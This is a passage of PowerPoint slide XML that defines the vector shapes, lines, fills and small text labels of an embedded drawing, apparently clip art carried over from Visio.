                    <a:pt x="42" y="109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="104"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="90"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="73"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="54"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FFFFFF"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="123" name="Rectangle 7"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="337" y="378"/>
              <a:ext cx="56"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zh-CN" sz="900">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>$</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" b="1">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="124" name="Line 8"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="90" y="127"/>
              <a:ext cx="92"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 name="Line 9"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="547" y="127"/>
              <a:ext cx="89"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 name="Line 10"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="122" y="316"/>
              <a:ext cx="486"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11"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="122" y="284"/>
              <a:ext cx="486"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 name="Line 12"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="122" y="253"/>
              <a:ext cx="486"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 name="Line 13"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="61" y="443"/>
              <a:ext cx="166"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 name="Line 14"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="487" y="443"/>
              <a:ext cx="182"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 name="Rectangle 15"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="195" y="153"/>
              <a:ext cx="347" cy="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zh-CN" sz="300">
                  <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                  <a:cs typeface="Arial" charset="0"/>
                </a:rPr>
                <a:t>VISIO CORPORATION</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1800" b="1">
                <a:ea typeface="宋体" pitchFamily="2" charset="-122"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="132" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="285" y="7"/>
              <a:ext cx="151" cy="91"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 58403 w 119"/>
                <a:gd name="T1" fmla="*/ 5921 h 77"/>
                <a:gd name="T2" fmla="*/ 58403 w 119"/>
                <a:gd name="T3" fmla="*/ 1760 h 77"/>
                <a:gd name="T4" fmla="*/ 49225 w 119"/>
                <a:gd name="T5" fmla="*/ 693 h 77"/>
                <a:gd name="T6" fmla="*/ 39966 w 119"/>
                <a:gd name="T7" fmla="*/ 2 h 77"/>
                <a:gd name="T8" fmla="*/ 28894 w 119"/>
                <a:gd name="T9" fmla="*/ 0 h 77"/>
                <a:gd name="T10" fmla="*/ 18364 w 119"/>
                <a:gd name="T11" fmla="*/ 2 h 77"/>
                <a:gd name="T12" fmla="*/ 8689 w 119"/>
                <a:gd name="T13" fmla="*/ 693 h 77"/>
                <a:gd name="T14" fmla="*/ 0 w 119"/>
                <a:gd name="T15" fmla="*/ 1760 h 77"/>
                <a:gd name="T16" fmla="*/ 0 w 119"/>
                <a:gd name="T17" fmla="*/ 5921 h 77"/>
                <a:gd name="T18" fmla="*/ 58403 w 119"/>
                <a:gd name="T19" fmla="*/ 5921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77"/>
                <a:gd name="T32" fmla="*/ 119 w 119"/>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77">
                  <a:moveTo>
                    <a:pt x="119" y="77"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="119" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="101" y="9"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="82" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="59" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17" y="9"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="23"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="77"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="119" y="77"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FFFFFF"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="133" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="289" y="111"/>
              <a:ext cx="55" cy="41"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 13429 w 43"/>
                <a:gd name="T1" fmla="*/ 0 h 34"/>
                <a:gd name="T2" fmla="*/ 0 w 43"/>
                <a:gd name="T3" fmla="*/ 3121 h 34"/>
                <a:gd name="T4" fmla="*/ 1440 w 43"/>
                <a:gd name="T5" fmla="*/ 4260 h 34"/>
                <a:gd name="T6" fmla="*/ 4930 w 43"/>
                <a:gd name="T7" fmla="*/ 3625 h 34"/>
                <a:gd name="T8" fmla="*/ 4930 w 43"/>
                <a:gd name="T9" fmla="*/ 4260 h 34"/>
                <a:gd name="T10" fmla="*/ 10499 w 43"/>
                <a:gd name="T11" fmla="*/ 3625 h 34"/>
                <a:gd name="T12" fmla="*/ 12146 w 43"/>
                <a:gd name="T13" fmla="*/ 4371 h 34"/>
                <a:gd name="T14" fmla="*/ 16772 w 43"/>
                <a:gd name="T15" fmla="*/ 3625 h 34"/>
                <a:gd name="T16" fmla="*/ 18741 w 43"/>
                <a:gd name="T17" fmla="*/ 4260 h 34"/>
                <a:gd name="T18" fmla="*/ 21971 w 43"/>
                <a:gd name="T19" fmla="*/ 3121 h 34"/>
                <a:gd name="T20" fmla="*/ 25773 w 43"/>
                <a:gd name="T21" fmla="*/ 0 h 34"/>
                <a:gd name="T22" fmla="*/ 13429 w 43"/>
                <a:gd name="T23" fmla="*/ 0 h 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
                <a:gd name="T37" fmla="*/ 0 h 34"/>
                <a:gd name="T38" fmla="*/ 43 w 43"/>
                <a:gd name="T39" fmla="*/ 34 h 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 h="34">
                  <a:moveTo>
                    <a:pt x="23" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="24"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="32"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="28"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8" y="32"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="18" y="28"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20" y="34"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="28"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="31" y="32"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="24"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="43" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="C0C0C0"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="134" name="Line 18"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="329" y="111"/>
              <a:ext cx="9" cy="3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 name="Line 19"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="313" y="111"/>
              <a:ext cx="18" cy="4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 name="Line 20"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="298" y="111"/>
              <a:ext cx="27" cy="3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 name="Line 21"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="290" y="111"/>
              <a:ext cx="31" cy="3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 name="Line 22"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="323" y="111"/>
              <a:ext cx="10" cy="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 name="Line 23"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="311" y="111"/>
              <a:ext cx="18" cy="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 name="Line 24"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="298" y="111"/>
              <a:ext cx="25" cy="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 name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="394" y="87"/>
              <a:ext cx="34" cy="24"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 4827 w 27"/>
                <a:gd name="T1" fmla="*/ 0 h 19"/>
                <a:gd name="T2" fmla="*/ 0 w 27"/>
                <a:gd name="T3" fmla="*/ 4013 h 19"/>
                <a:gd name="T4" fmla="*/ 1554 w 27"/>
                <a:gd name="T5" fmla="*/ 7312 h 19"/>
                <a:gd name="T6" fmla="*/ 6078 w 27"/>
                <a:gd name="T7" fmla="*/ 8226 h 19"/>
                <a:gd name="T8" fmla="*/ 7654 w 27"/>
                <a:gd name="T9" fmla="*/ 5069 h 19"/>
                <a:gd name="T10" fmla="*/ 10807 w 27"/>
                <a:gd name="T11" fmla="*/ 5069 h 19"/>
                <a:gd name="T12" fmla="*/ 4920 w 27"/>
                <a:gd name="T13" fmla="*/ 0 h 19"/>
                <a:gd name="T14" fmla="*/ 4827 w 27"/>
                <a:gd name="T15" fmla="*/ 0 h 19"/>
                <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                <a:gd name="T21" fmla="*/ 0 60000 65536"/>
                <a:gd name="T22" fmla="*/ 0 60000 65536"/>
                <a:gd name="T23" fmla="*/ 0 60000 65536"/>
                <a:gd name="T24" fmla="*/ 0 w 27"/>
                <a:gd name="T25" fmla="*/ 0 h 19"/>
                <a:gd name="T26" fmla="*/ 27 w 27"/>
                <a:gd name="T27" fmla="*/ 19 h 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 h="19">
                  <a:moveTo>
                    <a:pt x="12" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="9"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="19"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="27" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FFFFFF"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="142" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="344" y="111"/>
              <a:ext cx="31" cy="25"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 4223 w 25"/>
                <a:gd name="T1" fmla="*/ 0 h 21"/>
                <a:gd name="T2" fmla="*/ 3432 w 25"/>
                <a:gd name="T3" fmla="*/ 1205 h 21"/>
                <a:gd name="T4" fmla="*/ 5656 w 25"/>
                <a:gd name="T5" fmla="*/ 850 h 21"/>
                <a:gd name="T6" fmla="*/ 6405 w 25"/>
                <a:gd name="T7" fmla="*/ 1012 h 21"/>
                <a:gd name="T8" fmla="*/ 4223 w 25"/>
                <a:gd name="T9" fmla="*/ 1205 h 21"/>
                <a:gd name="T10" fmla="*/ 6543 w 25"/>
                <a:gd name="T11" fmla="*/ 1205 h 21"/>
                <a:gd name="T12" fmla="*/ 6405 w 25"/>
                <a:gd name="T13" fmla="*/ 1435 h 21"/>
                <a:gd name="T14" fmla="*/ 4223 w 25"/>
                <a:gd name="T15" fmla="*/ 1435 h 21"/>
                <a:gd name="T16" fmla="*/ 6405 w 25"/>
                <a:gd name="T17" fmla="*/ 1738 h 21"/>
                <a:gd name="T18" fmla="*/ 5656 w 25"/>
                <a:gd name="T19" fmla="*/ 2033 h 21"/>
                <a:gd name="T20" fmla="*/ 2966 w 25"/>
                <a:gd name="T21" fmla="*/ 1632 h 21"/>
                <a:gd name="T22" fmla="*/ 2 w 25"/>
                <a:gd name="T23" fmla="*/ 1738 h 21"/>
                <a:gd name="T24" fmla="*/ 0 w 25"/>
                <a:gd name="T25" fmla="*/ 1632 h 21"/>
                <a:gd name="T26" fmla="*/ 2966 w 25"/>
                <a:gd name="T27" fmla="*/ 1435 h 21"/>
                <a:gd name="T28" fmla="*/ 3432 w 25"/>
                <a:gd name="T29" fmla="*/ 0 h 21"/>
                <a:gd name="T30" fmla="*/ 4223 w 25"/>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5"/>
                <a:gd name="T49" fmla="*/ 0 h 21"/>
                <a:gd name="T50" fmla="*/ 25 w 25"/>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5" h="21">
                  <a:moveTo>
                    <a:pt x="15" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="9"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="15"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="15"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="19"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="21"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="19"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11" y="15"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FFFFFF"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="143" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="333" y="111"/>
              <a:ext cx="32" cy="25"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 9030 w 25"/>
                <a:gd name="T1" fmla="*/ 0 h 21"/>
                <a:gd name="T2" fmla="*/ 8268 w 25"/>
                <a:gd name="T3" fmla="*/ 1205 h 21"/>
                <a:gd name="T4" fmla="*/ 13330 w 25"/>
                <a:gd name="T5" fmla="*/ 850 h 21"/>
                <a:gd name="T6" fmla="*/ 13903 w 25"/>
                <a:gd name="T7" fmla="*/ 1012 h 21"/>
                <a:gd name="T8" fmla="*/ 9030 w 25"/>
                <a:gd name="T9" fmla="*/ 1205 h 21"/>
                <a:gd name="T10" fmla="*/ 15255 w 25"/>
                <a:gd name="T11" fmla="*/ 1205 h 21"/>
                <a:gd name="T12" fmla="*/ 13903 w 25"/>
                <a:gd name="T13" fmla="*/ 1435 h 21"/>
                <a:gd name="T14" fmla="*/ 9030 w 25"/>
                <a:gd name="T15" fmla="*/ 1435 h 21"/>
                <a:gd name="T16" fmla="*/ 13903 w 25"/>
                <a:gd name="T17" fmla="*/ 1738 h 21"/>
                <a:gd name="T18" fmla="*/ 13330 w 25"/>
                <a:gd name="T19" fmla="*/ 2033 h 21"/>
                <a:gd name="T20" fmla="*/ 6459 w 25"/>
                <a:gd name="T21" fmla="*/ 1632 h 21"/>
                <a:gd name="T22" fmla="*/ 1469 w 25"/>
                <a:gd name="T23" fmla="*/ 1738 h 21"/>
                <a:gd name="T24" fmla="*/ 0 w 25"/>
                <a:gd name="T25" fmla="*/ 1632 h 21"/>
                <a:gd name="T26" fmla="*/ 6459 w 25"/>
                <a:gd name="T27" fmla="*/ 1435 h 21"/>
                <a:gd name="T28" fmla="*/ 8268 w 25"/>
                <a:gd name="T29" fmla="*/ 0 h 21"/>
                <a:gd name="T30" fmla="*/ 9030 w 25"/>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5"/>
                <a:gd name="T49" fmla="*/ 0 h 21"/>
                <a:gd name="T50" fmla="*/ 25 w 25"/>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5" h="21">
                  <a:moveTo>
                    <a:pt x="15" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="9"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="11"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="25" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="15"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="15"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23" y="19"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="21" y="21"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2" y="19"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="17"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10" y="15"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FFFFFF"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="144" name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="359" y="48"/>
              <a:ext cx="77" cy="38"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 0 w 60"/>
                <a:gd name="T1" fmla="*/ 2271 h 32"/>
                <a:gd name="T2" fmla="*/ 12199 w 60"/>
                <a:gd name="T3" fmla="*/ 360 h 32"/>
                <a:gd name="T4" fmla="*/ 37813 w 60"/>
                <a:gd name="T5" fmla="*/ 0 h 32"/>
                <a:gd name="T6" fmla="*/ 39311 w 60"/>
                <a:gd name="T7" fmla="*/ 360 h 32"/>
                <a:gd name="T8" fmla="*/ 27456 w 60"/>
                <a:gd name="T9" fmla="*/ 1122 h 32"/>
                <a:gd name="T10" fmla="*/ 12199 w 60"/>
                <a:gd name="T11" fmla="*/ 2785 h 32"/>
                <a:gd name="T12" fmla="*/ 0 w 60"/>
                <a:gd name="T13" fmla="*/ 2271 h 32"/>
                <a:gd name="T14" fmla="*/ 0 60000 65536"/>
                <a:gd name="T15" fmla="*/ 0 60000 65536"/>
                <a:gd name="T16" fmla="*/ 0 60000 65536"/>
                <a:gd name="T17" fmla="*/ 0 60000 65536"/>
                <a:gd name="T18" fmla="*/ 0 60000 65536"/>
                <a:gd name="T19" fmla="*/ 0 60000 65536"/>
                <a:gd name="T20" fmla="*/ 0 60000 65536"/>
                <a:gd name="T21" fmla="*/ 0 w 60"/>
                <a:gd name="T22" fmla="*/ 0 h 32"/>
                <a:gd name="T23" fmla="*/ 60 w 60"/>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2">
                  <a:moveTo>
                    <a:pt x="0" y="26"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="19" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="58" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="60" y="4"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="42" y="13"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="19" y="32"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="26"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="808080"/>
            </a:solidFill>
            <a:ln w="3175">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:round/>
              <a:headEnd/>
              <a:tailEnd/>
            </a:ln>
          </p:spPr>
          <p:txBody>
            <a:bodyPr/>
            <a:lstStyle/>
            <a:p>
              <a:endParaRPr lang="zh-CN" altLang="en-US"/>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="145" name="Line 29"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="415" y="98"/>
              <a:ext cx="5"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 name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="415" y="98"/>
              <a:ext cx="4" cy="4"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 0 w 2"/>
                <a:gd name="T1" fmla="*/ 0 h 2"/>
                <a:gd name="T2" fmla="*/ 0 w 2"/>
                <a:gd name="T3" fmla="*/ 134217728 h 2"/>
                <a:gd name="T4" fmla="*/ 134217728 w 2"/>
                <a:gd name="T5" fmla="*/ 0 h 2"/>
                <a:gd name="T6" fmla="*/ 0 60000 65536"/>
                <a:gd name="T7" fmla="*/ 0 60000 65536"/>
                <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                <a:gd name="T9" fmla="*/ 0 w 2"/>
                <a:gd name="T10" fmla="*/ 0 h 2"/>
                <a:gd name="T11" fmla="*/ 2 w 2"/>
                <a:gd name="T12" fmla="*/ 2 h 2"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T6">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T7">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T8">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T9" t="T10" r="T11" b="T12"/>
              <a:pathLst>
                <a:path w="2" h="2">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="2"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2"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 name="未知"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="415" y="98"/>
              <a:ext cx="4" cy="4"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 134217728 w 2"/>
                <a:gd name="T1" fmla="*/ 0 h 2"/>
                <a:gd name="T2" fmla="*/ 0 w 2"/>
                <a:gd name="T3" fmla="*/ 0 h 2"/>
                <a:gd name="T4" fmla="*/ 0 w 2"/>
                <a:gd name="T5" fmla="*/ 134217728 h 2"/>
